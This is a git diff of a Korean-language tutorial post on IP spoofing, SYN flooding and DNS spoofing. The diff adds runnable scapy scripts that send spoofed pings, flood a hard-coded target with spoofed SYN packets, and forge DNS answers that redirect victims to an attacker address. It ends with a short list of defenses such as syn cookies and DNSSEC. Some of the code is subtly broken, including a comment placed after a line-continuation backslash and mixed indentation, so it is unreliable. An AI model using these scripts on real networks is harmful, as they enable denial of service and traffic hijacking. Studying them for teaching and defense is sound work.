@@ -140,11 +140,32 @@ iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination <공격
 IP 주소를 위조하여 Ping을 보내보자.
 {: .notice}
 
+```python
+from scapy.all import *
+
+def ipSpoof(srcip, dstip):
+    ip_packet = IP(src=srcip, dst=dstip)/ICMP()
+    print(ip_packet.show())
+    send(ip_packet)
+
+def main():
+    srcip = '172.21.70.227'
+    dstip = '172.21.70.180'
+    ipSpoof(srcip, dstip)
+    print('SENT SPOOFED IP [%s] to [%s]' %(srcip, dstip))
+    
+if __name__=='__main__':
+    main()
 ```
+
+IP 스푸핑을 이용하여 Syn Flooding을 해보자
+{: .notice}
+
+```python
 from scapy.all import *
 from random import shuffle
 
-def getRandomIP():
+def getRandomIP(): #랜덤한 IP 주소를 얻는다.
     ipfactors = [x for x in range(256)]
     tmpip = []
     for i in range(4):
@@ -158,7 +179,7 @@ def synAttack(targetip):
     P_IP = IP(src=srcip, dst=targetip)
     P_TCP = TCP(dport=range(1, 1024), flags='S')
     packet = P_IP/P_TCP
-    srflood(packet, store=0)
+    srflood(packet, store=0) #syn flooding 수행
    
 def main():
     targetip = '123.223.221.111'
@@ -168,27 +189,41 @@ if __name__ = '__main__':
     main()
 ```
 
+리눅스에서는 syn flooding에 의한 자원고갈을 막기위해 syn cookies 를 사용한다.
+{: .notice}
+
+```
+#echo 1> /proc/sys/net/ipv4/tcp_syncookies
+```
+
 ---
 ### DNS 스푸핑
 ---
 
-```
+DNS 스푸핑은 공격자가 중간에서 DNS 쿼리 패킷을 가로채어 질의한 IP를 조작한 후 DNS 응답 패킷을 피해 컴퓨터로 보내는 해킹 기법입니다.
+{: .notice}
+
+하지만 아래 코드의 경우 로컬 DNS 서버로 DNS 쿼리를 보낸 것을 가로챈 후 정상 DNS 서버로 포워딩 하고있어서 공격자가 변조한 DNS와 
+실제 DNS 서버로 부터 전송된 DNS 응답 모두 전달되어서 결론적으로 더 빨리 도착한 DNS 응답을 받게 된다.
+{: .notice--info}
+
+```python
 from scapy.all import *
 
 def dnsSpoof(packet):
-	spoofDNS = '172.21.70.227'
+	spoofDNS = '172.21.70.227' #이 주소로 변조
 	dstip = packet[IP].src
     srcip = packet[IP].dst
     sport = packet[UDP].sport
     dport = packet[UDP].dport
     
-    if packet.haslayer(DNSQR):
+    if packet.haslayer(DNSQR): #패킷이 DNS 쿼리를 포함하고 있을 경우에 DNS 응답을 생성하는 부분
         dnsid = packet[DNS].id
         qd = packet[DNS].qd
-        dnsrr = DNSRR(rrname=qd.qname, ttl=10, rdata=spoofDNS)
-        spoofPacket = IP(dst=dstip, src=srcip)/\
+        dnsrr = DNSRR(rrname=qd.qname, ttl=10, rdata=spoofDNS) #변조한 주소를 넣는다
+        spoofPacket = IP(dst=dstip, src=srcip)/\ #실제 응답 패킷 구성
         UDP(dport=sport, sport=dport)/DNS(id=dnsid, qd=qd, aa=1, qr=1, an=dnsrr)
-        send(spoofPacket)
+        send(spoofPacket) #패킷 전송
         print('+++ SOURCE[%s] -> DEST[%s]' %(dstip, srcip))
         print(spoofPacket.summary())
         
@@ -199,3 +234,34 @@ def main():
 if __name__ == '__main__':
     main()
 ```
+
+(더 늦게 도착은 패킷은 버린다: DNS 경쟁) 더 확실하게 DNS 스푸핑을 하려면 IP 테이블을 수정하여 UDP 53번 포트로 포워딩 되는
+데이터를 따로 처리하여 정상 DNS로 가지 못하도록 해야한다. 이를 위해서 파이썬 외부 모듈로 nfqueue 모듈을 사용할 수 있다.(리눅스)
+{: .notice--info}
+
+---
+### 보안 대책
+---
+
+* ARP 스푸핑
+	* 게이트웨이 MAC주소를 변조하지 못하도록 정적으로 설정
+{: .notice}
+
+* IP 스푸핑
+	* 구조적 취약점으로 완전한 보안책은 없다. 
+	* 지속적 모니터링 필요
+	* 패킷 필터링을 통해서 스위치/라우터에서 보내는 주소가 내부 IP 주소인 경우 차단
+	* rsh, rlogin과 같이 패스워드에 의한 인증 과정이 없는 서비스를 사용하지 않는다.
+{: .notice}
+
+* DNS 스푸핑 방어 대책
+	* DNS 요청시 무작위로 포트번호를 선택하고 비밀번호 생성을 통해 경쟁공격 대응 가능
+	* DNS 캐시 변조 방어를 위해 DNSSEC를 적용하여 디지털 서명을 통해 DNS 데이터를 검증한다
+	* DNS 스푸핑 공격에 대응하기위해서
+		* 모든 DNS 쿼리는 로컬 DNS 서버에서만 해석하도록함
+		* 외부 서버로 향하는 DNS 요청을 막음 
+		* DNSSEC를 적용
+		* DNS 해석기에 무작위 포트 번호를 처리할 수 있도록 설정
+		* 방화벽에 외부 DNS 룩업을 제한 하도록 설정
+		* 모든 사용자에게 Recursive DNS 서비스를 제한
+{: .notice}
